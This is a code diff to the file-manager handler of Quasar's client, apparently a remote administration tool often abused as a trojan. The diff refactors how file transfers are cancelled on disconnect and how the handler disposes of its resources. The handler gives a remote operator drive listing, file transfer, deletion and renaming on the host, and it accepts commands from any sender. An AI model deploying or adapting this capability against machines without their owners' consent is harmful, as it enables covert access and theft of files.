@@ -16,19 +16,43 @@ using System.Threading;
 
 namespace Quasar.Client.Messages
 {
-    public class FileManagerHandler : MessageProcessorBase<object>
+    public class FileManagerHandler : IMessageProcessor
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
 
         private readonly QuasarClient _client;
 
-        public FileManagerHandler(QuasarClient client) : base(false)
+        private CancellationTokenSource _tokenSource;
+
+        private CancellationToken _token;
+
+        public FileManagerHandler(QuasarClient client)
         {
             _client = client;
+            _client.ClientState += OnClientStateChange;
+            _tokenSource = new CancellationTokenSource();
+            _token = _tokenSource.Token;
         }
 
-        public override bool CanExecute(IMessage message) => message is GetDrives ||
+        private void OnClientStateChange(Networking.Client s, bool connected)
+        {
+            switch (connected)
+            {
+                case true:
+
+                    _tokenSource?.Dispose();
+                    _tokenSource = new CancellationTokenSource();
+                    _token = _tokenSource.Token;
+                    break;
+                case false:
+                    // cancel all running transfers on disconnect
+                    _tokenSource.Cancel();
+                    break;
+            }
+        }
+
+        public bool CanExecute(IMessage message) => message is GetDrives ||
                                                              message is GetDirectory ||
                                                              message is FileTransferRequest ||
                                                              message is FileTransferCancel ||
@@ -36,9 +60,9 @@ namespace Quasar.Client.Messages
                                                              message is DoPathDelete ||
                                                              message is DoPathRename;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -207,7 +231,7 @@ namespace Quasar.Client.Messages
                         _activeTransfers[message.Id] = srcFile;
                         foreach (var chunk in srcFile)
                         {
-                            if (!_client.Connected || !_activeTransfers.ContainsKey(message.Id))
+                            if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
                                 break;
 
                             // blocking sending might not be required, needs further testing
@@ -434,15 +458,27 @@ namespace Quasar.Client.Messages
         {
             if (_activeTransfers.ContainsKey(id))
             {
-                _activeTransfers[id].Dispose();
+                _activeTransfers[id]?.Dispose();
                 _activeTransfers.TryRemove(id, out _);
             }
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
         {
             if (disposing)
             {
+                _client.ClientState -= OnClientStateChange;
+                _tokenSource.Cancel();
+                _tokenSource.Dispose();
                 foreach (var transfer in _activeTransfers)
                 {
                     transfer.Value?.Dispose();
